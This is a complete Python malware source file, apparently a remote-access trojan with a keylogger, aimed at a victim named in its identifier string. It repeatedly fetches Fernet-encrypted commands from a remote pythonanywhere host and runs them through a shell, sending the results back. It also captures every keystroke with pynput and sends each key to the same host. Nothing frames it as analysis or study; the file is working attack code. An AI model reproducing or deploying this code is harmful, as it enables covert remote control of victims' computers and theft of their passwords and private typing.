
from __future__ import print_function


import json
import subprocess
import threading
from subprocess import PIPE
import pynput
import requests
from cryptography.fernet import Fernet
import time
import base64, hashlib

def gen_fernet_key(passcode:bytes) -> bytes:
    assert isinstance(passcode, bytes)
    hlib = hashlib.md5()
    hlib.update(passcode)
    return base64.urlsafe_b64encode(hlib.hexdigest().encode('latin-1'))

rad="urinfectedxd.pythonanywhere.com" #Remote Address
udid="trentonisaverydumbpersonandhiscomputerisinfected"
usk="MzCDiM3yLd6vxmkkZPXCi30I9SNMLPKz"
key = gen_fernet_key(usk.encode())
f = Fernet(key)

def rcf():
  global rad
  global udid
  global usk
  while True:
    time.sleep(1)
    if True:
      req=requests.get(f"http://{rad}/cssh/{udid}").content
      dec=f.decrypt(req).decode()
      req=json.loads(dec)
      for cmd in req["cmds"]:
        p=subprocess.run(cmd["cmd"],shell=True, stdout=PIPE, stderr=PIPE)
        enc=f.encrypt(json.dumps({"out":[p.returncode, p.stdout.decode(), p.stderr.decode()]}).encode()).decode()
        requests.get(f"https://{rad}/rfl/{udid}/{enc}")

def rfl(k):
  global rad
  global udid
  global usk
  enc=f.encrypt(json.dumps({"out": [0, "TESTING", "ERROR"]}).encode()).decode()
  requests.get(f"https://{rad}/rfl/{udid}/{enc}")

def rkd(k):
  global rad
  global udid
  global usk
  if isinstance(k, pynput.keyboard.Key):
    name = k.name
  elif isinstance(k, pynput.keyboard.KeyCode):
    name = k.char
  crypt=f.encrypt(name.encode())
  requests.get("http://{}/rkd/{}/{}".format(rad,udid,crypt.decode()))
def klf():
  global rad
  global udid
  global usk
  with pynput.keyboard.Listener(on_press=rkd) as listener:
    listener.join()

def main():
  threading.Thread(target=rcf).start()
  t2=threading.Thread(target=klf)
  t2.start()
  t2.join()
if __name__=="__main__":
 main()